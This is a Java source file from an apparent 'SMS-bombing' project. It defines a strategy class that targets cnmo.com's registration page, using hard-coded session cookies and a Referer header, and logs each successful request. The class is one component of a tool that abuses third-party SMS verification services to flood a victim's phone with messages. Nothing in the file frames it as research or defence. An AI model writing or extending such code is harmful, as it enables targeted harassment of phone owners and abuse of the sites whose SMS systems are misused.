package com.github.bombing.strategy;

/**
 * @projectName: SMS-bombing
 * @package: com.github.bombing.execute.strategy
 * @className: CNMOStrategy
 * @date: 2022/3/15
 * @version: 1.0
 */
public class CNMOStrategy extends AbstractBombingStrategy<String> {

    @Override
    public Strategy strategy() {
        return Strategy.CNMO;
    }

    @Override
    protected void before() {
        HEADERS.put(COOKIE, "PHPSESSID=pltnohdiiltgg5sr332updq821; cnmo_e476_RGTK=EGPOAPRREGRSJPLGECLOIROFEEIOKCLW5I6FTC7O5IXI; 0e35da6ea84d4ea681cc28659c8c7546=WyIxNDA3ODI3NTMwIl0; ip_ck=78OJ5fn1j7QuODQ4MjMyLjE2NDg2MjQzODQ%3D; lv=1648624384; vn=1; cnmo_e476_post_seccode=c2bav%2BklOkKG5PSAYBZlxdLX988iohS6b074VAlugiRP7AOgP0nJkTGD0TE; z_pro_city=s_provice%3Dshanghai%26s_city%3Dshanghai");
        HEADERS.put("Referer", "http://passport.cnmo.com/register/");
    }

    @Override
    protected void doResp(String res) {
        logger.info(">>> " + strategy().getDesc() + " 请求成功, 返回内容为: " + res);
    }

}
